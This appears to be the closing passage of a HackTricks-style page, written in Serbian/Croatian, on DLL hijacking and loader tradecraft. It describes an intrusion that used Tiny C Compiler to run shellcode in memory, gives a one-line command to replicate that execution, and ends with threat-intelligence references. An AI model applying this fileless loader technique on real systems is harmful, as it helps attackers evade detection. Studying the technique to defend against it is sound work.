- Ista intruzija je drop-ovala Tiny C Compiler i izvršila `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored. Napadač-om dostavljen C source je embedovao shellcode, kompajlirao i pokrenuo in-memory bez toga da stvori PE na disku. Replicirati sa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza je importovala `Wininet.dll` pri runtime i povukla second-stage shellcode sa hardcoded URL-a, pružajući fleksibilan loader koji se prerušava kao compiler run.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
